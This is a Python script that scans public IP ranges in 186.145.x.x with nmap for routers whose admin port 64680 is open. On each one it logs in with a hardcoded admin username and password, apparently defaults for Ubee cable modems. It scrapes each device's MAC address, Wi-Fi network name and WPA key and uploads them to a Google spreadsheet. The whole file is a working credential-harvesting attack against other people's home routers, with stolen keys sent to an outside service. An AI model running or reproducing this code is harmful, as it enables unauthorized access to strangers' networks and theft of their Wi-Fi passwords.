# -*- coding: utf-8 -*-
#segmento de 186
import requests as rq
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as BS
import gspread
from oauth2client.service_account import ServiceAccountCredentials
global user, password,header
import subprocess
#http://186.145.0.207:64680/goform/wlanGuestNetwork
user = "admin"
password = "Uq-4GIt3M"
auth= HTTPBasicAuth(user,password)
rq = rq.Session()
header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
scope = ['https://spreadsheets.google.com/feeds']
credentials = ServiceAccountCredentials.from_json_keyfile_name('redes.json', scope)
gc = gspread.authorize(credentials)
sht2 = gc.open_by_url('https://docs.google.com/spreadsheets/d/1FJ3VH9H9sqAoJ4bOlYZyWNdt8z6bByYOn0T18-XPywU/edit#gid=0')
worksheet = sht2.get_worksheet(0)
row = 5
#http://186.145.0.207:64680/wlanGuestNetwork.asp
def login(ip,row):
    try:
        
        url = ip
        ssid = url+"/wlanBasic.asp"
        pwd = url +"/wlanSecurity.asp"
        ssid = rq.get(ssid,auth=auth,timeout=None)
        print ssid.status_code
        ssid = BS(ssid.content,"html.parser")
        pwd = rq.get(pwd,auth=auth,timeout=None)
        print pwd.status_code
        pwd = BS(pwd.content,"html.parser")
    
        #print ssid
        mac = str(ssid.find(text="Wireless MAC Address:").findNext("td").text)
        ssid = str(ssid.find("input",{"name":"ServiceSetIdentifier"})["value"])
        pwd = str(pwd.find("input",{"name":"WpaPreSharedKey"})["value"])
        print "url: %s, mac: %s, ssid: %s, pass: %s, Ubee"%(url,mac,ssid,pwd)
        worksheet.update_acell('B%s'%(row), mac)
        worksheet.update_acell('C%s'%(row), ssid)
        worksheet.update_acell('D%s'%(row), pwd)
        worksheet.update_acell('E%s'%(row), "Ubee")
    
    except:
        msg = "Error"
        worksheet.update_acell('B%s'%(row), msg)
        worksheet.update_acell('C%s'%(row), msg)
        worksheet.update_acell('D%s'%(row), msg)
"""
ip = "http://186.145.7.6:64680"
login(ip,row)
"""
for last in range(20,256):
    rang = "186.145.%s.*"%(last)
    print rang
    ips = subprocess.check_output("sudo nmap -Pn %s -p64680 --open | awk '/is up/ {print up}; {gsub (/\(|\)/,\"\"); up = $NF}'" %(rang),shell=True)

    for ip in ips.splitlines():
        url = str(ip)
        ip = "http://%s:64680"%(ip)
        print ip
        worksheet.update_acell('A%s'%(row), str(ip))
        login(ip, row)
        row = row + 1
